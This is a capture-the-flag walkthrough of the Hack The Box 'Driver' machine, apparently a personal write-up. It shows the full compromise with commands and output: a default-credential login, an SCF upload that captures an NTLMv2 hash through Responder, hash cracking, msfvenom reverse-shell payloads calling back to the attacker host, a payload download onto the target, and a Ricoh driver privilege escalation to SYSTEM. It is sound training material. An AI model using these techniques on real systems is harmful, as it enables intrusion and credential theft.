https://app.hackthebox.com/machines/Driver

## NMAP

```
# Nmap 7.93 scan initiated Sun Oct 30 22:15:19 2022 as: nmap -T4 -p- -oA nmap_basic 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up (0.052s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

# Nmap done at Sun Oct 30 22:17:13 2022 -- 1 IP address (1 host up) scanned in 114.01 seconds

```

advanced scan:

```
joshua@kaligra:~/Documents/htb/machines/Driver$ sudo nmap -T4 -p80,135,445,5985 10.10.11.106 -A -oA nmap_advanced
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 22:18 CET
Nmap scan report for 10.10.11.106
Host is up (0.064s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows 10 1511 (85%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m14s, deviation: 0s, median: 7h00m13s
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-10-31T04:18:44
|_  start_date: 2022-10-31T04:12:21

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   70.89 ms 10.10.14.1
2   70.90 ms 10.10.11.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.88 seconds
```

## Website

It is asking us valid credentials:

![](attachment/Pasted%20image%2020221030222107.png)


We type `admin:admin` and we are in:

![](attachment/Pasted%20image%2020221030222142.png)

From "Firmware updates" page, we try to upload a very simple "hello world" ASP file.

```
<%
Response.Write("Hello World!")
%>
```

We got success:


![](attachment/Pasted%20image%2020221030222534.png)



But it seems that file is not stored on document root:

![](attachment/Pasted%20image%2020221030222759.png)


Let's try with PHP file (we noticed `fw_up.php` in URL)

We use classic PHP web shell from Pentestmonkey:
https://pentestmonkey.net/tools/web-shells/php-reverse-shell

But even this time, we got 404 not found.

Let's try gobusting

```
joshua@kaligra:~/Documents/htb/machines/Driver$ gobuster dir -u http://10.10.11.106 -U admin -P admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.106
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Auth User:               admin
[+] Timeout:                 10s
===============================================================
2022/10/30 22:37:22 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.11.106/images/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.11.106/Images/]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.11.106/IMAGES/]
Progress: 220482 / 220561 (99.96%)===============================================================
2022/10/30 22:55:52 Finished
```

Nothing interesting.

We also tried with `ffuf`.
Remember that we need to use Basic HTTP Authentication:

```
joshua@kaligra:~/driver$ echo -n "admin:admin" | base64
YWRtaW46YWRtaW4=

```

```
ffuf -ic -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -H "Authorization: Basic YWRtaW46YWRtaW4=" -u http://10.10.11.106/FUZZ.php
```

Nothing interesting.

We can assume that maybe the file that we upload will be open/executed from "staff", so we try to create a malicious exe file with a reverse shell payload.

```
joshua@kaligra:~/Documents/htb/machines/Driver$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f exe -o driver.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: driver.exe
```


..Nothing happens.

I cheated a bit and I discovered the `scf` file technique

I created this file:

```
[Shell]
Command=2
IconFile=\\10.10.14.43\tools\nc.ico
[Taskbar]
Command=ToggleDesktop

```

and I ran `Responder` on my tun0 interface:

```
root@kaligra:~# responder -I tun0 -dwv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
..
..
```


after uploading scf file, I got credentials:

```
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:adf84f9e2bb7ef03:08FC5376AC79A5CCAEDC05E4392FC6CB:0101000000000000808B91857EEDD80151EA0FC7A10546C10000000002000800380046004400500001001E00570049004E002D004B003500510054005000500036005200500059004E0004003400570049004E002D004B003500510054005000500036005200500059004E002E0038004600440050002E004C004F00430041004C000300140038004600440050002E004C004F00430041004C000500140038004600440050002E004C004F00430041004C0007000800808B91857EEDD80106000400020000000800300030000000000000000000000000200000A93FD758C227B75D4A0BEF1D713D7CDE06E36D37A174C4CC114E7FB23295AC730A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0034003300000000000000000000000000

```


cracked with `haschat`

```
joshua@kaligra:~/driver$ cat > hash
tony::DRIVER:adf84f9e2bb7ef03:08FC5376AC79A5CCAEDC05E4392FC6CB:0101000000000000808B91857EEDD80151EA0FC7A10546C10000000002000800380046004400500001001E00570049004E002D004B003500510054005000500036005200500059004E0004003400570049004E002D004B003500510054005000500036005200500059004E002E0038004600440050002E004C004F00430041004C000300140038004600440050002E004C004F00430041004C000500140038004600440050002E004C004F00430041004C0007000800808B91857EEDD80106000400020000000800300030000000000000000000000000200000A93FD758C227B75D4A0BEF1D713D7CDE06E36D37A174C4CC114E7FB23295AC730A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0034003300000000000000000000000000
joshua@kaligra:~/driver$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

```

So far, we get these credentials:

```
tony:liltony

```

Now we can use `evil-winrm`

## User Flag

```
joshua@kaligra:~/driver$ evil-winrm -u tony -p liltony -i 10.10.11.106

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> cd ..
c*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/31/2022   7:37 PM             34 user.txt


*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
6a65c91062023f4eb99c2020ecbc4853

```


## Local enumeration

it seems we cannot run `systeminfo`

```
*Evil-WinRM* PS C:\firmwares> systeminfo
systeminfo.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```


We found something interesting in Powershell history:

```
*Evil-WinRM* PS C:\users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1

```


## Privesc

We can try this:

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/local/ricoh_driver_privesc.md

but we need meterpreter shell.

Let's use again msfvenom

```
joshua@kaligra:~/driver$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.43 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe


```

We transfer to target machine with Python webserver:



```
*Evil-WinRM* PS C:\users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> iwr -UseBasicParsing http://10.10.14.43:8080/shell.exe -o shell.exe
*Evil-WinRM* PS C:\users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> dir


    Directory: C:\users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/28/2021  12:06 PM            134 ConsoleHost_history.txt
-a----       10/31/2022  10:46 PM           3223 meterpreter-64.ps1
-a----       10/31/2022  10:54 PM           7168 shell.exe

```


Let's run our handler:

```
$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 4444; set ExitOnSession false; exploit -j"

```

From target:

```
*Evil-WinRM* PS C:\users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> .\shell.exe

```

We receive Meterpreter shell:

```
msf6 exploit(multi/handler) > [*] Sending stage (200774 bytes) to 10.10.11.106
[*] Meterpreter session 1 opened (10.10.14.43:4444 -> 10.10.11.106:49436) at 2022-10-31 23:55:34 +0100

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information           Connection
  --  ----  ----                     -----------           ----------
  1         meterpreter x64/windows  DRIVER\tony @ DRIVER  10.10.14.43:4444 -> 10.10.11.106:49436 (10.10.11.106)

```

```
meterpreter > getuid
Server username: DRIVER\tony
meterpreter > sysinfo
Computer        : DRIVER
OS              : Windows 10 (10.0 Build 10240).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
meterpreter >

```

Meterpreter shell dies continuosly.
We try another one:

```
joshua@kaligra:~/driver$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.43 LPORT=4444 -f exe -o runme.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 695 bytes
Final size of exe file: 7168 bytes
Saved as: runme.exe
```

```
joshua@kaligra:~/driver$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set lhost tun0; set lport 4444; exploit"

```

We migrate to a process in session 1 (runme.exe is in session 0)

```
meterpreter > ps

Process List
============

 PID   PPID  Name                           Arch  Session  User         Path
 ---   ----  ----                           ----  -------  ----         ----
 0     0     [System Process]
 4     0     System
 268   4     smss.exe
 344   336   csrss.exe
 452   336   wininit.exe
 460   444   csrss.exe
 504   444   winlogon.exe
 568   452   services.exe
 576   452   lsass.exe
 660   568   svchost.exe
 712   568   svchost.exe
 728   568   svchost.exe
 808   504   dwm.exe
 816   568   svchost.exe
 884   568   svchost.exe
 892   568   svchost.exe
 936   816   OneDriveStandaloneUpdater.exe  x86   1        DRIVER\tony  C:\Users\tony\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe
 944   568   svchost.exe
 1016  568   svchost.exe
 1044  944   WUDFHost.exe
 1228  568   spoolsv.exe
 1396  568   svchost.exe
 1444  816   taskeng.exe
 1580  568   svchost.exe
 1592  568   svchost.exe
 1676  568   svchost.exe
 1688  568   vm3dservice.exe
 1696  568   VGAuthService.exe
 1748  568   vmtoolsd.exe
 1756  568   svchost.exe
 2032  1688  vm3dservice.exe
 2100  816   taskhostw.exe                  x64   1        DRIVER\tony  C:\Windows\System32\taskhostw.exe
 2124  660   explorer.exe                   x64   1        DRIVER\tony  C:\Windows\explorer.exe
 2128  816   sihost.exe                     x64   1        DRIVER\tony  C:\Windows\System32\sihost.exe
 2144  816   cmd.exe                        x64   1        DRIVER\tony  C:\Windows\System32\cmd.exe
 2240  568   dllhost.exe
 2412  568   msdtc.exe
 2428  660   WmiPrvSE.exe
 2596  2144  conhost.exe                    x64   1        DRIVER\tony  C:\Windows\System32\conhost.exe
 2704  568   svchost.exe
 2724  568   svchost.exe                    x64   1        DRIVER\tony  C:\Windows\System32\svchost.exe
 2768  568   SearchIndexer.exe
 2920  3140  OneDrive.exe                   x86   1        DRIVER\tony  C:\Users\tony\AppData\Local\Microsoft\OneDrive\OneDrive.exe
 3140  3120  explorer.exe                   x64   1        DRIVER\tony  C:\Windows\explorer.exe
 3164  660   SearchUI.exe                   x64   1        DRIVER\tony  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 3196  660   RuntimeBroker.exe              x64   1        DRIVER\tony  C:\Windows\System32\RuntimeBroker.exe
 3572  568   svchost.exe
 3604  660   ShellExperienceHost.exe        x64   1        DRIVER\tony  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 3748  568   svchost.exe
 3976  568   svchost.exe
 4072  660   wsmprovhost.exe                x64   0        DRIVER\tony  C:\Windows\System32\wsmprovhost.exe
 4248  4072  runme.exe                      x64   0        DRIVER\tony  C:\Users\tony\Documents\runme.exe
 4460  568   sedsvc.exe
 4772  2144  PING.EXE                       x64   1        DRIVER\tony  C:\Windows\System32\PING.EXE
 4832  660   WmiPrvSE.exe
 4912  660   explorer.exe                   x64   1        DRIVER\tony  C:\Windows\explorer.exe
 5056  3140  vmtoolsd.exe                   x64   1        DRIVER\tony  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 5064  660   explorer.exe                   x64   1        DRIVER\tony  C:\Windows\explorer.exe

meterpreter > migrate 5064
[*] Migrating from 4248 to 5064...
[*] Migration completed successfully.


```


We then use Rioch exploit  (`ricoh_driver_privesc`)

```
msf6 exploit(multi/handler) > use exploit/windows/local/ricoh_driver_privesc
msf6 exploit(windows/local/ricoh_driver_privesc) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(windows/local/ricoh_driver_privesc) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/local/ricoh_driver_privesc) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/local/ricoh_driver_privesc) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ricoh_driver_privesc) > run

[*] Started HTTPS reverse handler on https://10.10.14.43:5555
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer WxwPry...
[!] https://10.10.14.43:5555 handling request from 10.10.11.106; (UUID: 6y0mlfjy) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.43:5555 handling request from 10.10.11.106; (UUID: 6y0mlfjy) Staging x64 payload (201820 bytes) ...
[!] https://10.10.14.43:5555 handling request from 10.10.11.106; (UUID: 6y0mlfjy) Without a database connected that payload UUID tracking will not work!
```

Apparently, this is not working, but we type Control-C a couple of times and we check our sessions:

```
^C[*] Deleting printer WxwPry

^C[-] run: Interrupted
msf6 exploit(windows/local/ricoh_driver_privesc) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x86/windows  DRIVER\tony @ DRIVER          10.10.14.43:4444 -> 10.10.11.106:49416 (10.10.11.106)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DRIVER  10.10.14.43:5555 -> 10.10.11.106:49419 (10.10.11.106)

```


We notice session 2 with SYSTEM privilege:

```
msf6 exploit(windows/local/ricoh_driver_privesc) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 3248 created.
Channel 2 created.
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```




